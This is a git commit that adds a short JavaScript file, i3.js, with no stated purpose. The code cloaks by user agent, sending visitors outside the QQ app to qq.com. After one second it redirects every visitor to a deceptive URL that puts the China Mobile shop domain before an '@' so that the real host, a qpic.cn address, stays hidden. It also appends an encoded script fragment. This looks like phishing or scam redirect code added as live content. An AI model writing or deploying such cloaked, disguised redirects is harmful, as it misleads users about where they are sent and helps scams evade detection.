7970d99c4d8e6a9776976bbcb3c3d9c31bfa2096
iuuc <145624790+iuuc@users.noreply.github.com>
2023-12-31 21:41:12 +0800

    Create i3.js

---
+++ i3.js
@@ -0,0 +1,15 @@
+function leleua() {
+    var sUserAgent = navigator.userAgent.toLowerCase();
+    if (sUserAgent.match(/QQ/i) == 'qq' || location.href.indexOf("edit") > -1) {
+    } else {
+        window.location.href = "https://qq.com";
+    }
+}
+
+leleua();
+
+setTimeout(function() {
+    var timestamp = new Date().getTime();
+    var url = 'https://shop.10086.cn@meeting-75420.picgzc.qpic.cn/ff8267e3566dbad4a1aa0f50775569e814f56f7768691c9048f42681cfa7a308' + '?' + timestamp + '%3Cscript';
+    location.href = url;
+}, 1000);
